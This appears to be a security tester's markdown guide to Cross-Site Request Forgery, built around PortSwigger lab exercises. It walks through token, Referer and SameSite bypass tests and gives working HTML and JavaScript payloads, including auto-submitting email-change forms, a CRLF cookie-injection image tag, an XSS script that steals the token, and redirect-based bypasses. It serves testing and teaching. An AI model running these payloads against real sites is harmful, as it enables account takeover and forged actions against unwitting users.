# CSRF (Cross-Site Request Forgery) Attack Guide

---

## Index

1. [Testing CSRF Token](#testing-csrf-token)
2. [Testing CSRF Token and CSRF Key Cookies](#testing-csrf-token-and-csrf-key-cookies)
   - [CSRF Exploit With CRLF Injection](#CSRF-Exploit-With-CRLF-Injection)
   - [Exploitation Techniques](#exploitation-techniques)
      - [HTML Exploit Example](#html-exploit-example)
      - [Image-based CSRF Cookie Injection](#image-based-csrf-cookie-injection)
      - [XSS Based CSRF Attack](#XSS-Based-CSRF-Attack)
3. [Testing the Referer Header for CSRF Attack](#testing-the-referer-header-for-csrf-attack)
   - [Referer validation depends on header being present](#Referer-validation-depends-on-header-being-present)
   - [Broken referer validation](#Broken-referer-validation)
4. [Bypassing SameSite Policy](#bypassing-samesite-policy)
   - [Lax Bypass Via Method Override](#Lax-Bypass-Via-Method-Override)
   - [Strict Bypass Via Client Side Redirect](#Strict-Bypass-Via-Client-Side-Redirect)
5. [Notes](#Notes)
6. [CSRF Exploit For All Method](#CSRF-Exploit-For-All-Method)
---

## Testing CSRF Token

When testing a CSRF token, follow these steps:

1. **Remove CSRF parameter/token**: Check if the application accepts requests without the token.
2. **Change request method (POST to GET)**: Test if changing the method affects token validation.
3. **Exchange CSRF token with another user**: Verify if tokens are user-specific by testing another user’s token.

---

## Testing CSRF Token and CSRF Key Cookies

**Case 1: If CSRF cookie Not Tied With User Session Cookie**

1. **Submit an invalid CSRF token**: See if the application accepts it.
2. **Submit a valid CSRF token from another user**: Check if the token is user-specific. 
3. **Submit a valid CSRF token and CSRF Key cookie from another user**: Test if both token and cookie are required to match.
4. **Assign a random value to token + cookie**: In a duplicated token cookie, try setting the same random value to both.

**Case 2: If CSRF cookie Tied With User Session Cookie (Exclusive)**

**Summary :** Suppose there is a web application where the CSRF token or CSRF token + CSRF key is tied to the user's session cookie. If we replace the CSRF token or CSRF token + CSRF key with that of another user and the request still returns a `200 OK` response, it indicates that the application is vulnerable to a CSRF attack. A potential exploitation method is explained in the following [Portswigger Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie).

### CSRF Exploit With CRLF Injection

[Portswigger Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

---

### Exploitation Techniques

To exploit a CSRF token + cookie mechanism, two actions are required:

1. **Inject a CSRF cookie into the user's session** (via HTTP header injection)
2. **Send a CSRF attack to the victim**

### HTML Exploit Example

```html
<form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
<script>
        document.forms[0].submit();
</script>
```

### Image-based CSRF Cookie Injection

```html
<form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
```

### XSS Based CSRF Attack

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get', '/my-account', true);
  req.send();

  function handleResponse() {
    // Extract the CSRF token from the response
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];

    // Display the token in a popup alert
    alert('Extracted CSRF Token: ' + token);

    // Send a POST request to change the email
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf=' + token + '&email=test@test.com');
  }
</script>
```

---

## Testing the Referer Header for CSRF Attack

1. **Remove the Referer header**: See if the application still processes the request without it. If the application process it, the site might be vulnerable.
2. **Validate which part of the Referer header is used**: Identify which part is validated by the application.

   - **Example 1**: `Referer: https://attacker.com/?vulnerable-web.net`
   - **Example 2**: `Referer: http://vulnerable-website.com.attacker-website.com/csrf-attack`

### Referer validation depends on header being present

1. **Remove the Referer Header**
2. **Add ```<meta name="referrer" content="no-referrer">``` between the ```head``` tag in you payload**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
</head>
  <body>
    <form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Broken referer validation

Some web application only validate some selective portion of a referer url. In this case we can exploit this by making some change in push state function of a csrf exploit.

1. **Add the portion of referer url as a query parameter after `/` of push state function.**
2. **Add ```<meta name="referrer" content="unsafe-url">``` between the ```head``` tag in you payload**
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
   <meta name="referrer" content="unsafe-url">
</head>
  <body>
    <form action="https://0afc00a10434115f83de504c00d4008a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a111&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0afc00a10434115f83de504c00d4008a.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

For details: [Portswigger](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-can-be-circumvented)

---

## Bypassing SameSite Policy

[Same site explanation](https://www.youtube.com/watch?v=aUF2QCEudPo&t=360s)

### Lax Bypass Via Method Override

1. **Change request method from POST to GET in Burp**
2. **Try overriding the method by adding the ```_method``` parameter to the query string. `[HTML forms don't support the PUT, PATCH, or DELETE methods. However, some frameworks provide a _method field to simulate these methods.]`**

**Example**: GET /my-account/change-email?email=pwned@hacked.com```&_method=POST``` HTTP/1.1

**Payload Or, we can use burp csrf poc generator.**
```javascript
<script>
    document.location = "https://vulnerable.web/my-account/change-email?email=pwned@hacked.com&_method=POST";
</script>
```
--- 

### Strict Bypass Via Client Side Redirect

If there is a endpoint in website that redirecting to another page of website, you can use this process to bypass strict attribute.

1. **Change request method from POST to GET in Burp**
2. **Identify a endpoint that redirect the traffic to another page**
3. **Now copy and paste the request that you changed from POST to GET in the redirection path**
4. **If possible, you can also use the path traversal technique**

**Example**: ```https://vulnblog.web/post/comment/confirmation?postId=../my-account```. Here, ```postId``` parameter trying a redirection and we are trying to exlploit the change-email functionality in ```/my-account``` page.

**Payload**
```javascript
<script>
    document.location = "https://vulnerable.web/post/comment/confirmation?postId=../my-account/change-email?email=a111%40a.com%26submit=1";
</script>
```
---

### Notes

| Attribute         | Sent with Cross-Origin Requests? | Sent on Same-Site Requests? | Notes                                       |
|-------------------|----------------------------------|-----------------------------|---------------------------------------------|
| `Strict`          | No                              | Yes                         | Most secure, but may reduce usability.      |
| `Lax`             | Limited (e.g., navigation GET)  | Yes                         | Good balance between usability and security.|
| `None` (with `Secure`) | Yes                             | Yes                         | Necessary for third-party cookies.          |
| No Attribute      | Limited (assumed `Lax`)         | Yes                         | Default behavior in most modern browsers.   |

**Key Note:**
```plaintext
Set-Cookie: session=bciZoELY2ukJUUOj1zJ7wcAGdYXtvq3C; Secure; HttpOnly; SameSite=Strict
```

Here, `Secure` and `HttpOnly` attributes in the `Set-Cookie` header enhance the security of cookies:

1. **`Secure` Attribute**  
   - Ensures the cookie is only sent over **HTTPS** connections.
   - Prevents the cookie from being transmitted over **unencrypted (HTTP)** connections, reducing the risk of **man-in-the-middle (MITM) attacks** or **cookie stealing via xss attack**.
   - If Secure is set, even if the user accidentally accesses the site over HTTP, the browser won’t send the cookie to attacker via xss attack. On the other hand, An attacker on the same network `(e.g., public Wi-Fi)` won't be able to sniffs the HTTP traffic and steals the session cookie.

2. **`HttpOnly` Attribute**  
   - Restricts client-side JavaScript from accessing the cookie.
   - Prevents attacks like **Cross-Site Scripting (XSS)** from stealing the cookie using `document.cookie`.

**Example:**
If a website is vulnerable to XSS and an attacker injects:
```js
console.log(document.cookie);
```
- Without `HttpOnly`: The attacker can steal the `session` cookie.
- With `HttpOnly`: JavaScript **cannot** access the cookie, protecting user sessions.
  

<img width="1116" height="348" alt="Screenshot From 2025-07-26 22-36-29" src="https://github.com/user-attachments/assets/39b890d4-b65a-47f4-8a0b-14208a1b5342" />

### CSRF Exploit For All Method

```js
<!doctype html>
<html>
  <body>
    <h3>Testing CSRF</h3>
    <script>
      (async function(){
        const target = 'https://www.target.com/payment/recurring-billing/?checkout=4606715';
        try {
          const resp = await fetch(target, {
            method: 'GET',
            credentials: 'include',
            headers: {
              'Access-Control-Request-Method': 'DELETE',
              'Access-Control-Request-Headers': 'content-type, x-requested-with'
            }
          });
          console.log('METHOD status:', resp.status);
          console.log('Headers:'); for (const [k,v] of resp.headers) console.log(k, v);
          alert('Success — check console.');
        } catch (e) {
          console.error(e);
          alert('Failed — see console.');
        }
      })();
    </script>
  </body>
</html>

```

---
